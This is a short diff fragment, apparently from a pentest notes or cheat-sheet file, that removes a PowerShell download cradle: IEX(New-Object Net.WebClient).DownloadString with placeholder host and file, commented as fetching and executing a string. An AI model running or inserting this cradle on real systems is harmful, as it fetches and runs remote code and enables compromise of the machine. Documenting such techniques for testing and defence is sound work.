@@ -1,3 +1,0 @@
-# send GET request and execute string
-IEX(New-Object Net.WebClient).DownloadString('<lhost>/<file>')
-
